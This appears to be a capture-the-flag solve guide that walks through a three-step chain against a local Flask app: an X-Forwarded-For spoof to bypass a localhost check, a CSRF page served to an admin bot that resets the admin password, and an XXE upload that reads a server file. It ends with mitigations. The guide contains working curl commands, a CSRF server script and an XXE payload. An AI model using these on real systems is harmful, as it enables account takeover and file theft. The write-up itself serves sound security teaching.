# Solve Guide: Double Crossed 🕸️

## Flag
`P2P{flag_content}`

---

## Overview

Three vulnerabilities chained in sequence:

```
X-Forwarded-For bypass → Register account
  → Post URL → Report post → Admin bot visits URL
    → CSRF changes admin password → Login as admin
      → XXE via XML upload → Read /app/flag.txt
```

The name "Double Crossed" nods to two of the three: **XSS** (Cross-Site Scripting, the intended rabbit hole) and **XXE** (XML External Entity). The middle step turns out to be **CSRF**, not XSS — the admin bot visits URLs rather than rendering injected HTML.

---

## Step 1 — X-Forwarded-For Bypass to Register

`/register` is protected by `@local_required`, which checks the client IP:

```python
def get_user_ip():
    if "X-Forwarded-For" in request.headers:
        return request.headers["X-Forwarded-For"]   # trusted blindly!
    return request.remote_addr

def local_required(f):
    def decorated_function(*args, **kwargs):
        if get_user_ip() != "127.0.0.1":
            abort(403)
        ...
```

The app trusts the `X-Forwarded-For` header without any validation. Spoofing it bypasses the restriction:

```bash
curl -X POST http://localhost:3000/register \
  -H 'X-Forwarded-For: 127.0.0.1' \
  -d 'username=attacker&email=attacker@evil.com&password=hunter2' \
  -c cookies.txt -i
```

Save the session cookie from the response for subsequent requests.

---

## Step 2 — Understand the Admin Bot

Every post has a **Report** button. Reporting a post calls `/report/<post_id>`, which spawns a thread running `run_moderation_bot()`:

```python
# bot.py
def run_moderation_bot(post_id):
    urls = re.findall(r'(https?://[^\s]+)', post.content)
    browser = setup_browser()          # Headless Chromium
    browser.get(f"{base_url}/login")   # Logs in as admin
    for url in urls:
        browser.get(url)               # Visits every URL in the post
```

The bot logs in as admin and then visits every URL found in the reported post's content. This is the XSS rabbit hole — post content is HTML-escaped, so injected scripts don't execute. But the bot **visits external URLs as an authenticated admin**, which enables CSRF.

---

## Step 3 — CSRF to Hijack the Admin Account

The `/settings` endpoint changes passwords with no CSRF token:

```python
@app.route("/settings", methods=["GET", "POST"])
@login_required
def settings():
    if request.method == "POST":
        new_password = request.form.get("new_password")
        confirm_password = request.form.get("confirm_password")
        current_user.set_password(new_password)
        db.session.commit()
```

### Attack

Set up an HTTP server serving a page that auto-submits the password-change form:

```python
# csrf_server.py
from http.server import HTTPServer, BaseHTTPRequestHandler

CSRF_PAGE = b"""<!DOCTYPE html>
<html><body>
<form id="f" action="http://localhost:3000/settings" method="POST">
  <input name="new_password" value="pwned123">
  <input name="confirm_password" value="pwned123">
</form>
<script>document.getElementById('f').submit();</script>
</body></html>"""

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(CSRF_PAGE)

HTTPServer(("0.0.0.0", 9999), H).serve_forever()
```

Create a post containing the URL to your server, then report it:

```bash
# Create post with URL
curl -X POST http://localhost:3000/create-post \
  -b cookies.txt \
  -d 'content=check this out http://YOUR_IP:9999/'

# Report the post (triggers bot)
curl -X POST http://localhost:3000/report/POST_ID \
  -b cookies.txt
```

The admin bot visits your page → auto-submits the form → admin password is now `pwned123`.

Log in as admin:

```bash
curl -X POST http://localhost:3000/login \
  -d 'email=admin@p2p.dmu&password=pwned123' \
  -c admin_cookies.txt
```

---

## Step 4 — XXE via Admin XML Upload

The admin dashboard at `/admin` contains a **bulk user import** feature that accepts XML files. The parser is configured dangerously:

```python
parser = etree.XMLParser(
    resolve_entities=True,   # XXE enabled!
    load_dtd=True
)
tree = etree.parse(file, parser)
```

### XXE Payload

The `username` and `email` fields from the XML are stored in the database and displayed on the profile page — perfect for exfiltration:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<users>
  <user>
    <username>flagreader</username>
    <email>&xxe;</email>
    <password>password123</password>
  </user>
</users>
```

Upload this to `/admin/upload_users`:

```bash
curl -X POST http://localhost:3000/admin/upload_users \
  -b admin_cookies.txt \
  -F 'userfile=@payload.xml'
```

The flag content from `/app/flag.txt` is stored as the user's email. Retrieve it by logging in as `flagreader` or viewing the admin user list.

---

## Why "Double Crossed"?

The name is a double misdirection:

| What you think | What it actually is |
|----------------|---------------------|
| XSS in post content | Posts are HTML-escaped — no XSS |
| XSS via admin bot | Bot visits URLs, not rendered HTML — CSRF instead |
| Two vulns (XX + E?) | Three vulns chained: bypass + CSRF + XXE |

The "double cross" is the challenge crossing you twice — once with the XSS false lead, and once with the name itself.

---

## Vulnerability Summary

| # | Vulnerability | Location | Impact |
|---|--------------|----------|--------|
| 1 | `X-Forwarded-For` IP spoofing | `get_user_ip()` in `app.py` | Bypass registration restriction |
| 2 | CSRF (no token on `/settings`) | `settings()` in `app.py` | Hijack admin account via bot |
| 3 | XXE (external entity resolution enabled) | `admin_upload_users()` in `app.py` | Read arbitrary server files |

## Mitigations

- Validate `X-Forwarded-For` against a trusted proxy allowlist, or don't use it for access control
- Add CSRF tokens to all state-changing forms (Flask-WTF handles this automatically)
- Disable external entity resolution: `etree.XMLParser(resolve_entities=False, load_dtd=False)`
